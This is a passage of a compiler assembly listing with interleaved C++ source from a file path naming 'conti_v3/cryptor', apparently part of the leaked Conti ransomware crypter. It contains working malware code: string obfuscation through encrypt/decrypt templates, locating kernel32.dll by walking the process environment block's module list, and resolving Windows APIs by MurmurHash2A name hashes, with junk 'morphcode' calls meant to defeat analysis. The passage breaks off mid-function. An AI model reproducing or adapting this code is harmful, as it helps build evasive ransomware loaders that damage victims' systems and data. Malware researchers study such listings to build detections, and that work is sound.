  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00479	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0047d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv280[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00483	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0048a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00491	5f		 pop	 rdi
  00492	5d		 pop	 rbp
  00493	c3		 ret	 0
??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetKernel32@@YAPEAUHINSTANCE__@@XZ
_TEXT	SEGMENT
krnl32$ = 8
Kernel32Dll$ = 40
ModuleList$ = 68
ModuleListFlink$ = 100
KernelBaseAddr$ = 132
peb$ = 168
mdllist$ = 200
mlink$ = 232
krnbase$ = 264
mdl$ = 296
$T1 = 520
?GetKernel32@@YAPEAUHINSTANCE__@@XZ PROC		; GetKernel32, COMDAT

; 477  : {

$LN8:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 68 02
	00 00		 sub	 rsp, 616		; 00000268H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 478  : 	HMODULE krnl32;
; 479  : 	PCWCHAR Kernel32Dll = OBFW(L"Kernel32.dll");

  0001b	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BK@EJBALEBG@?$AAK?$AAe?$AAr?$AAn?$AAe?$AAl?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl@
  00022	48 8d 8d 08 02
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00029	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
  0002e	48 8b c8	 mov	 rcx, rax
  00031	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  00036	48 89 45 28	 mov	 QWORD PTR Kernel32Dll$[rbp], rax

; 480  : 
; 481  : #ifdef _WIN64
; 482  : 	const auto ModuleList = 0x18;

  0003a	c7 45 44 18 00
	00 00		 mov	 DWORD PTR ModuleList$[rbp], 24

; 483  : 	const auto ModuleListFlink = 0x18;

  00041	c7 45 64 18 00
	00 00		 mov	 DWORD PTR ModuleListFlink$[rbp], 24

; 484  : 	const auto KernelBaseAddr = 0x10;

  00048	c7 85 84 00 00
	00 10 00 00 00	 mov	 DWORD PTR KernelBaseAddr$[rbp], 16

; 485  : 	const INT_PTR peb = __readgsqword(0x60);

  00052	65 48 8b 04 25
	60 00 00 00	 mov	 rax, QWORD PTR gs:96
  0005b	48 89 85 a8 00
	00 00		 mov	 QWORD PTR peb$[rbp], rax

; 486  : #else
; 487  : 	int ModuleList = 0x0C;
; 488  : 	int ModuleListFlink = 0x10;
; 489  : 	int KernelBaseAddr = 0x10;
; 490  : 	INT_PTR peb = __readfsdword(0x30);
; 491  : #endif
; 492  : 
; 493  : 	//    kernel32.dll
; 494  : 	const auto mdllist = *(INT_PTR*)(peb + ModuleList);

  00062	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR peb$[rbp]
  00069	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  0006d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR mdllist$[rbp], rax

; 495  : 	morphcode(mdllist);

  00074	8b 8d c8 00 00
	00		 mov	 ecx, DWORD PTR mdllist$[rbp]
  0007a	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 496  : 	const auto mlink = *(INT_PTR*)(mdllist + ModuleListFlink);

  0007f	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR mdllist$[rbp]
  00086	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  0008a	48 89 85 e8 00
	00 00		 mov	 QWORD PTR mlink$[rbp], rax

; 497  : 	morphcode(mlink);

  00091	8b 8d e8 00 00
	00		 mov	 ecx, DWORD PTR mlink$[rbp]
  00097	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 498  : 	auto krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);

  0009c	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR mlink$[rbp]
  000a3	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]
  000a7	48 89 85 08 01
	00 00		 mov	 QWORD PTR krnbase$[rbp], rax

; 499  : 	morphcode(krnbase);

  000ae	8b 8d 08 01 00
	00		 mov	 ecx, DWORD PTR krnbase$[rbp]
  000b4	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 500  : 
; 501  : 	auto mdl = (LDR_MODULE*)mlink;

  000b9	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR mlink$[rbp]
  000c0	48 89 85 28 01
	00 00		 mov	 QWORD PTR mdl$[rbp], rax
$LN4@GetKernel3:

; 502  : 	do
; 503  : 	{
; 504  : 		mdl = (LDR_MODULE*)mdl->e[0].Flink;

  000c7	b8 10 00 00 00	 mov	 eax, 16
  000cc	48 6b c0 00	 imul	 rax, rax, 0
  000d0	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR mdl$[rbp]
  000d7	48 8b 04 01	 mov	 rax, QWORD PTR [rcx+rax]
  000db	48 89 85 28 01
	00 00		 mov	 QWORD PTR mdl$[rbp], rax

; 505  : 		morphcode(mdl);

  000e2	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR mdl$[rbp]
  000e9	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 506  : 
; 507  : 		if (mdl->base != nullptr)

  000ee	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR mdl$[rbp]
  000f5	48 83 78 30 00	 cmp	 QWORD PTR [rax+48], 0
  000fa	74 25		 je	 SHORT $LN5@GetKernel3

; 508  : 		{
; 509  : 			morphcode(mdl->base);

  000fc	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR mdl$[rbp]
  00103	48 8b 48 30	 mov	 rcx, QWORD PTR [rax+48]
  00107	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 510  : 
; 511  : 			if (GetHashBase(mdl) == KERNEL32DLL_HASH) { // KERNEL32.DLL

  0010c	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR mdl$[rbp]
  00113	e8 00 00 00 00	 call	 ?GetHashBase@@YAKPEAULDR_MODULE@@@Z ; GetHashBase
  00118	3d d8 71 67 b2	 cmp	 eax, -1301843496	; b26771d8H
  0011d	75 02		 jne	 SHORT $LN6@GetKernel3

; 512  : 
; 513  : 				break;

  0011f	eb 10		 jmp	 SHORT $LN3@GetKernel3
$LN6@GetKernel3:
$LN5@GetKernel3:

; 514  : 
; 515  : 			}
; 516  : 		}
; 517  : 	} while (mlink != (INT_PTR)mdl);

  00121	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR mdl$[rbp]
  00128	48 39 85 e8 00
	00 00		 cmp	 QWORD PTR mlink$[rbp], rax
  0012f	75 96		 jne	 SHORT $LN4@GetKernel3
$LN3@GetKernel3:

; 518  : 
; 519  : 	krnl32 = static_cast<HMODULE>(mdl->base);

  00131	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR mdl$[rbp]
  00138	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  0013c	48 89 45 08	 mov	 QWORD PTR krnl32$[rbp], rax

; 520  : 	morphcode(krnl32);

  00140	48 8b 4d 08	 mov	 rcx, QWORD PTR krnl32$[rbp]
  00144	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 521  : 	return krnl32;

  00149	48 8b 45 08	 mov	 rax, QWORD PTR krnl32$[rbp]

; 522  : }

  0014d	48 8d a5 48 02
	00 00		 lea	 rsp, QWORD PTR [rbp+584]
  00154	5f		 pop	 rdi
  00155	5d		 pop	 rbp
  00156	c3		 ret	 0
?GetKernel32@@YAPEAUHINSTANCE__@@XZ ENDP		; GetKernel32
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetHashBase@@YAKPEAULDR_MODULE@@@Z
_TEXT	SEGMENT
name$ = 16
i$ = 104
$T4 = 328
__$ArrayPad$ = 344
mdll$ = 384
?GetHashBase@@YAKPEAULDR_MODULE@@@Z PROC		; GetHashBase, COMDAT

; 452  : {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+424]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 453  : 	char name[64];
; 454  : 
; 455  : 	size_t i = 0;

  00049	48 c7 45 68 00
	00 00 00	 mov	 QWORD PTR i$[rbp], 0
$LN2@GetHashBas:

; 456  : 
; 457  : 	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1)

  00051	48 8b 85 80 01
	00 00		 mov	 rax, QWORD PTR mdll$[rbp]
  00058	48 8b 40 60	 mov	 rax, QWORD PTR [rax+96]
  0005c	48 8b 4d 68	 mov	 rcx, QWORD PTR i$[rbp]
  00060	0f b7 04 48	 movzx	 eax, WORD PTR [rax+rcx*2]
  00064	85 c0		 test	 eax, eax
  00066	74 59		 je	 SHORT $LN3@GetHashBas
  00068	48 83 7d 68 3f	 cmp	 QWORD PTR i$[rbp], 63	; 0000003fH
  0006d	73 52		 jae	 SHORT $LN3@GetHashBas

; 458  : 	{
; 459  : 
; 460  : 		morphcode(mdll->dllname.Buffer[i]);

  0006f	48 8b 85 80 01
	00 00		 mov	 rax, QWORD PTR mdll$[rbp]
  00076	48 8b 40 60	 mov	 rax, QWORD PTR [rax+96]
  0007a	48 8b 4d 68	 mov	 rcx, QWORD PTR i$[rbp]
  0007e	0f b7 04 48	 movzx	 eax, WORD PTR [rax+rcx*2]
  00082	8b c8		 mov	 ecx, eax
  00084	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 461  : 
; 462  : 		name[i] = (char)mdll->dllname.Buffer[i];

  00089	48 8b 85 80 01
	00 00		 mov	 rax, QWORD PTR mdll$[rbp]
  00090	48 8b 40 60	 mov	 rax, QWORD PTR [rax+96]
  00094	48 8b 4d 68	 mov	 rcx, QWORD PTR i$[rbp]
  00098	48 8b 55 68	 mov	 rdx, QWORD PTR i$[rbp]
  0009c	0f b6 04 50	 movzx	 eax, BYTE PTR [rax+rdx*2]
  000a0	88 44 0d 10	 mov	 BYTE PTR name$[rbp+rcx], al

; 463  : 
; 464  : 		morphcode(name[i]);

  000a4	48 8b 45 68	 mov	 rax, QWORD PTR i$[rbp]
  000a8	0f be 44 05 10	 movsx	 eax, BYTE PTR name$[rbp+rax]
  000ad	8b c8		 mov	 ecx, eax
  000af	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 465  : 
; 466  : 		i++;

  000b4	48 8b 45 68	 mov	 rax, QWORD PTR i$[rbp]
  000b8	48 ff c0	 inc	 rax
  000bb	48 89 45 68	 mov	 QWORD PTR i$[rbp], rax

; 467  : 	}

  000bf	eb 90		 jmp	 SHORT $LN2@GetHashBas
$LN3@GetHashBas:

; 468  : 
; 469  : 	name[i] = 0;

  000c1	48 8b 45 68	 mov	 rax, QWORD PTR i$[rbp]
  000c5	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T4[rbp], rax
  000cc	48 83 bd 48 01
	00 00 40	 cmp	 QWORD PTR $T4[rbp], 64	; 00000040H
  000d4	73 02		 jae	 SHORT $LN5@GetHashBas
  000d6	eb 05		 jmp	 SHORT $LN6@GetHashBas
$LN5@GetHashBas:
  000d8	e8 00 00 00 00	 call	 __report_rangecheckfailure
$LN6@GetHashBas:
  000dd	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR $T4[rbp]
  000e4	c6 44 05 10 00	 mov	 BYTE PTR name$[rbp+rax], 0

; 470  : 
; 471  : 	return MurmurHash2A(name, StrLen(name), HASHING_SEED);

  000e9	48 8d 4d 10	 lea	 rcx, QWORD PTR name$[rbp]
  000ed	e8 00 00 00 00	 call	 ?StrLen@@YAHPEBD@Z	; StrLen
  000f2	41 b8 da fc 01
	b8		 mov	 r8d, -1207829286	; b801fcdaH
  000f8	8b d0		 mov	 edx, eax
  000fa	48 8d 4d 10	 lea	 rcx, QWORD PTR name$[rbp]
  000fe	e8 00 00 00 00	 call	 ?MurmurHash2A@@YAIPEBXHI@Z ; MurmurHash2A
$LN4@GetHashBas:

; 472  : }

  00103	48 8b f8	 mov	 rdi, rax
  00106	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0010a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetHashBase@@YAKPEAULDR_MODULE@@@Z$rtcFrameData
  00111	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00116	48 8b c7	 mov	 rax, rdi
  00119	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00120	48 33 cd	 xor	 rcx, rbp
  00123	e8 00 00 00 00	 call	 __security_check_cookie
  00128	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  0012f	5f		 pop	 rdi
  00130	5d		 pop	 rbp
  00131	c3		 ret	 0
?GetHashBase@@YAKPEAULDR_MODULE@@@Z ENDP		; GetHashBase
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z
_TEXT	SEGMENT
poh$ = 8
Table$ = 40
DataSize$ = 68
Ordinal$ = 100
Found$ = 132
NamesTable$2 = 168
OrdinalTable$3 = 200
i$4 = 228
ProcName$5 = 264
Ret$ = 296
$T6 = 516
Module$ = 576
ProcNameHash$ = 584
Address$ = 592
?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z PROC		; GetApiAddr, COMDAT

; 382  : {

$LN12:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec 48 02
	00 00		 sub	 rsp, 584		; 00000248H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00021	b9 5a 00 00 00	 mov	 ecx, 90			; 0000005aH
  00026	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002b	f3 ab		 rep stosd
  0002d	48 8b 8c 24 68
	02 00 00	 mov	 rcx, QWORD PTR [rsp+616]
  00035	c6 85 04 02 00
	00 00		 mov	 BYTE PTR $T6[rbp], 0
  0003c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00043	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 383  : 	/*-----------        -----------*/
; 384  : 	//    PE 
; 385  : 	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((char*)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

  00048	48 8b 85 40 02
	00 00		 mov	 rax, QWORD PTR Module$[rbp]
  0004f	48 63 40 3c	 movsxd	 rax, DWORD PTR [rax+60]
  00053	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  0005a	48 8d 44 01 18	 lea	 rax, QWORD PTR [rcx+rax+24]
  0005f	48 89 45 08	 mov	 QWORD PTR poh$[rbp], rax

; 386  : 
; 387  : 	//    
; 388  : 	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

  00063	b8 08 00 00 00	 mov	 eax, 8
  00068	48 6b c0 00	 imul	 rax, rax, 0
  0006c	48 8b 4d 08	 mov	 rcx, QWORD PTR poh$[rbp]
  00070	8b 44 01 70	 mov	 eax, DWORD PTR [rcx+rax+112]
  00074	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  0007b	48 03 c8	 add	 rcx, rax
  0007e	48 8b c1	 mov	 rax, rcx
  00081	48 89 45 28	 mov	 QWORD PTR Table$[rbp], rax

; 389  : 
; 390  : 	DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

  00085	b8 08 00 00 00	 mov	 eax, 8
  0008a	48 6b c0 00	 imul	 rax, rax, 0
  0008e	48 8b 4d 08	 mov	 rcx, QWORD PTR poh$[rbp]
  00092	8b 44 01 74	 mov	 eax, DWORD PTR [rcx+rax+116]
  00096	89 45 44	 mov	 DWORD PTR DataSize$[rbp], eax

; 391  : 
; 392  : 	INT Ordinal; //    
; 393  : 	BOOL Found = FALSE;

  00099	c7 85 84 00 00
	00 00 00 00 00	 mov	 DWORD PTR Found$[rbp], 0

; 394  : 
; 395  : 	if (HIWORD(ProcNameHash) == 0)

  000a3	8b 85 48 02 00
	00		 mov	 eax, DWORD PTR ProcNameHash$[rbp]
  000a9	48 c1 e8 10	 shr	 rax, 16
  000ad	48 25 ff ff 00
	00		 and	 rax, 65535		; 0000ffffH
  000b3	0f b7 c0	 movzx	 eax, ax
  000b6	85 c0		 test	 eax, eax
  000b8	75 25		 jne	 SHORT $LN5@GetApiAddr

; 396  : 	{
; 397  : 		//     
; 398  : 		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;

  000ba	8b 85 48 02 00
	00		 mov	 eax, DWORD PTR ProcNameHash$[rbp]
  000c0	48 25 ff ff 00
	00		 and	 rax, 65535		; 0000ffffH
  000c6	0f b7 c0	 movzx	 eax, ax
  000c9	48 8b 4d 28	 mov	 rcx, QWORD PTR Table$[rbp]
  000cd	2b 41 10	 sub	 eax, DWORD PTR [rcx+16]
  000d0	c6 85 04 02 00
	00 01		 mov	 BYTE PTR $T6[rbp], 1
  000d7	89 45 64	 mov	 DWORD PTR Ordinal$[rbp], eax

; 399  : 	}

  000da	e9 f1 00 00 00	 jmp	 $LN6@GetApiAddr
$LN5@GetApiAddr:

; 400  : 	else
; 401  : 	{
; 402  : 		//    
; 403  : 		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table->AddressOfNames);

  000df	48 8b 45 28	 mov	 rax, QWORD PTR Table$[rbp]
  000e3	8b 40 20	 mov	 eax, DWORD PTR [rax+32]
  000e6	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  000ed	48 03 c8	 add	 rcx, rax
  000f0	48 8b c1	 mov	 rax, rcx
  000f3	48 89 85 a8 00
	00 00		 mov	 QWORD PTR NamesTable$2[rbp], rax

; 404  : 		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

  000fa	48 8b 45 28	 mov	 rax, QWORD PTR Table$[rbp]
  000fe	8b 40 24	 mov	 eax, DWORD PTR [rax+36]
  00101	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  00108	48 03 c8	 add	 rcx, rax
  0010b	48 8b c1	 mov	 rax, rcx
  0010e	48 89 85 c8 00
	00 00		 mov	 QWORD PTR OrdinalTable$3[rbp], rax

; 405  : 
; 406  : 		unsigned int i;
; 407  : 		char* ProcName;
; 408  : 
; 409  : 		for (i = 0; i < Table->NumberOfNames; ++i)

  00115	c7 85 e4 00 00
	00 00 00 00 00	 mov	 DWORD PTR i$4[rbp], 0
  0011f	eb 0e		 jmp	 SHORT $LN4@GetApiAddr
$LN2@GetApiAddr:
  00121	8b 85 e4 00 00
	00		 mov	 eax, DWORD PTR i$4[rbp]
  00127	ff c0		 inc	 eax
  00129	89 85 e4 00 00
	00		 mov	 DWORD PTR i$4[rbp], eax
$LN4@GetApiAddr:
  0012f	48 8b 45 28	 mov	 rax, QWORD PTR Table$[rbp]
  00133	8b 40 18	 mov	 eax, DWORD PTR [rax+24]
  00136	39 85 e4 00 00
	00		 cmp	 DWORD PTR i$4[rbp], eax
  0013c	0f 83 8e 00 00
	00		 jae	 $LN3@GetApiAddr

; 410  : 		{
; 411  : 
; 412  : 			ProcName = (char*)RVATOVA(Module, *NamesTable);

  00142	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR NamesTable$2[rbp]
  00149	8b 00		 mov	 eax, DWORD PTR [rax]
  0014b	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  00152	48 03 c8	 add	 rcx, rax
  00155	48 8b c1	 mov	 rax, rcx
  00158	48 89 85 08 01
	00 00		 mov	 QWORD PTR ProcName$5[rbp], rax

; 413  : 
; 414  : 
; 415  : 			if (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash)

  0015f	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR ProcName$5[rbp]
  00166	e8 00 00 00 00	 call	 ?StrLen@@YAHPEBD@Z	; StrLen
  0016b	41 b8 da fc 01
	b8		 mov	 r8d, -1207829286	; b801fcdaH
  00171	8b d0		 mov	 edx, eax
  00173	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR ProcName$5[rbp]
  0017a	e8 00 00 00 00	 call	 ?MurmurHash2A@@YAIPEBXHI@Z ; MurmurHash2A
  0017f	3b 85 48 02 00
	00		 cmp	 eax, DWORD PTR ProcNameHash$[rbp]
  00185	75 20		 jne	 SHORT $LN7@GetApiAddr

; 416  : 			{
; 417  : 				Ordinal = *OrdinalTable;

  00187	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR OrdinalTable$3[rbp]
  0018e	0f b7 00	 movzx	 eax, WORD PTR [rax]
  00191	c6 85 04 02 00
	00 01		 mov	 BYTE PTR $T6[rbp], 1
  00198	89 45 64	 mov	 DWORD PTR Ordinal$[rbp], eax

; 418  : 				Found = TRUE;

  0019b	c7 85 84 00 00
	00 01 00 00 00	 mov	 DWORD PTR Found$[rbp], 1

; 419  : 				break;

  001a5	eb 29		 jmp	 SHORT $LN3@GetApiAddr
$LN7@GetApiAddr:

; 420  : 			}
; 421  : 
; 422  : 			//    
; 423  : 			++NamesTable;

  001a7	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR NamesTable$2[rbp]
  001ae	48 83 c0 04	 add	 rax, 4
  001b2	48 89 85 a8 00
	00 00		 mov	 QWORD PTR NamesTable$2[rbp], rax

; 424  : 			++OrdinalTable;

  001b9	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR OrdinalTable$3[rbp]
  001c0	48 83 c0 02	 add	 rax, 2
  001c4	48 89 85 c8 00
	00 00		 mov	 QWORD PTR OrdinalTable$3[rbp], rax

; 425  : 
; 426  : 		}

  001cb	e9 51 ff ff ff	 jmp	 $LN2@GetApiAddr
$LN3@GetApiAddr:
$LN6@GetApiAddr:

; 427  : 
; 428  : 	}
; 429  : 
; 430  : 
; 431  : 	//   
; 432  : 	if (!Found) {

  001d0	83 bd 84 00 00
	00 00		 cmp	 DWORD PTR Found$[rbp], 0
  001d7	75 12		 jne	 SHORT $LN8@GetApiAddr

; 433  : 
; 434  : 		*Address = 0;

  001d9	48 8b 85 50 02
	00 00		 mov	 rax, QWORD PTR Address$[rbp]
  001e0	48 c7 00 00 00
	00 00		 mov	 QWORD PTR [rax], 0

; 435  : 		return 0;

  001e7	33 c0		 xor	 eax, eax
  001e9	eb 62		 jmp	 SHORT $LN1@GetApiAddr
$LN8@GetApiAddr:

; 436  : 
; 437  : 	}
; 438  : 
; 439  : 	ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal);

  001eb	80 bd 04 02 00
	00 00		 cmp	 BYTE PTR $T6[rbp], 0
  001f2	75 0c		 jne	 SHORT $LN11@GetApiAddr
  001f4	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z$rtcName$0
  001fb	e8 00 00 00 00	 call	 _RTC_UninitUse
$LN11@GetApiAddr:
  00200	44 8b 45 64	 mov	 r8d, DWORD PTR Ordinal$[rbp]
  00204	48 8b 55 28	 mov	 rdx, QWORD PTR Table$[rbp]
  00208	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR Module$[rbp]
  0020f	e8 00 00 00 00	 call	 ?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z ; GetFunctionAddresss
  00214	48 89 85 28 01
	00 00		 mov	 QWORD PTR Ret$[rbp], rax

; 440  : 
; 441  : 	if (CheckForForvardedProc(Ret, Table, DataSize)) {

